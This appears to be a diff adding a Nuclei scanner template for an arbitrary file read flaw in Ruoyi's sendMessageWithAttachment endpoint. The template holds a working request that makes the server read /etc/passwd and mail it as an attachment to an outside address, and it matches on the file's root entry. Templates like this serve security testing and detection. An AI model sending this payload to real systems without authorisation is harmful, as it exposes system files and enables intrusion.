@@ -1,0 +1,28 @@
+id: ruoyi-sendmessagewithattachment-lfi
+
+info:
+  name: Ruoyi sendMessageWithAttachment 任意文件读取漏洞
+  author: qwtd
+  severity: medium
+  description: |
+    Ruoyi sendMessageWithAttachment 存在任意文件读取漏洞，攻击者可利用该漏洞读取任意文件。
+  reference:
+    - https://mp.weixin.qq.com/s/CeBimyW7wmjt2xz0VynJNQ
+  metadata:
+    verified: false
+    max-request: 1
+  tags: 若依-管理系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/demo/mail/sendMessageWithAttachment?to=test111@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
